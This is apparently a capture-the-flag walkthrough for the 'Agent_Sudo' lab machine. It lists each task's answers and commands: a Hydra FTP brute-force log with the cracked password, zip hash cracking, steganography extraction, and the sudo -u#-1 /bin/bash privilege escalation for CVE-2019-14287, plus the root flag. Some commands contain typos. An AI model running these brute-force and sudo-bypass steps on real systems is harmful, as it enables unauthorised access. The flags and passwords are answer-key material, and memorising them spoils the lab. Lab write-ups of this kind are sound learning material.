#Machine Name : Agent_Sudo
#Machine IP : 110.10.167.223

***TASK1***
Deploy

***TASK2***
```
1.How many open ports?
:3

2.How you redirect yourself to a secret page?
:user-agent

3.What is the agent name?
:chris

use command?
curl "{ip}" -H "user-agent:c" -L
```

***TASK3***
1.FTP Password

```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-02 14:31:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.167.223:21/
[STATUS] 159.00 tries/min, 159 tries in 00:01h, 14344240 to do in 1503:36h, 16 active
[21][ftp] host: 10.10.167.223   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-02 14:33:52

:crystal
```

2.Zip file password
```
: strings cutie.png
: binwalk -e cutie.png
: zip2john 8702.zip > hashes_for_john.txt
: john hashes_for_jhon.txt --worlist={password file path}
```
: alien

3.steg password
```
: 7z e 8702.zip
: cat  base64msg | base64 -d
:Area51
```

4.Who is the other agent ( in full name)?
```
: steghide extract -sf cute-alien.jpg
: james
```

5.SSh password
```
:hackerrules!
```
***TASK4: Capture the user flag***


***TASK5: Privilege Escalation***
```
#1 CVE number for the escalation : cve-2019-14287
# sudo -u#-1 /bin/bash

#2 What is the root flag : 53a02f55b57d4439e3341834d70c062

#3 (Bonus) Who is Agent R? : DesKel

```
